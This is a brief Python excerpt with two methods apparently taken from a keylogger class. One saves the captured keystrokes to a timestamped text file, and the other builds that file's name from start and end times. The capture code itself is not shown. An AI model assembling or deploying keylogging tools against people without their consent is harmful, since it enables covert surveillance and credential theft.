def report_to_file(self):
    """This method creates a log file in the current directory that contains
    the current keylogs in the `self.log` variable"""
    # open the file in write mode (create it)
    with open(f"{self.filename}.txt", "w") as f:
        # write the keylogs to the file
        print(self.log, file=f)
    print(f"[+] Saved {self.filename}.txt")

def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"